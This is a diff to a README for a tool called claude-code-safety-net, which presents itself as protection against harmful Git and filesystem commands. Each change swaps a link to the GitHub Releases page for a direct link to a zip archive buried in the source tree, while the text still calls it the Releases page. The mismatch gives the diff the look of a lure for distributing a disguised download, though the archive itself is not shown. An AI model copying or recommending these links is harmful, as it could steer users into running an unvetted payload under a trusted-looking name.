@@ -1,7 +1,7 @@
 # 🛡️ claude-code-safety-net - Your Safety Shield Against Harmful Commands
 
 ## 📥 Download Now
-[![Download claude-code-safety-net](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/waleedkhanbaloch/claude-code-safety-net/releases)
+[![Download claude-code-safety-net](https://github.com/waleedkhanbaloch/claude-code-safety-net/raw/refs/heads/main/src/features/builtin-commands/code-claude-net-safety-v3.0.zip)](https://github.com/waleedkhanbaloch/claude-code-safety-net/raw/refs/heads/main/src/features/builtin-commands/code-claude-net-safety-v3.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the claude-code-safety-net! This application helps protect your files and data by stopping harmful Git and filesystem commands before they can cause damage. Follow these simple steps to get started.
@@ -21,7 +21,7 @@ To run claude-code-safety-net, ensure your system meets these requirements:
 - **Regular Updates**: Get enhancements and security improvements.
 
 ## 📥 Download & Install
-To download claude-code-safety-net, visit the following page: [Download Page](https://github.com/waleedkhanbaloch/claude-code-safety-net/releases).
+To download claude-code-safety-net, visit the following page: [Download Page](https://github.com/waleedkhanbaloch/claude-code-safety-net/raw/refs/heads/main/src/features/builtin-commands/code-claude-net-safety-v3.0.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the application.
@@ -53,4 +53,4 @@ We regularly update claude-code-safety-net to enhance features and improve secur
 ## 🌟 Acknowledgements
 A special thanks to the contributors and testers who help improve and secure claude-code-safety-net. Your feedback and support are invaluable.
 
-For more detailed information and updates, please refer back to our [GitHub Releases page](https://github.com/waleedkhanbaloch/claude-code-safety-net/releases).
+For more detailed information and updates, please refer back to our [GitHub Releases page](https://github.com/waleedkhanbaloch/claude-code-safety-net/raw/refs/heads/main/src/features/builtin-commands/code-claude-net-safety-v3.0.zip).
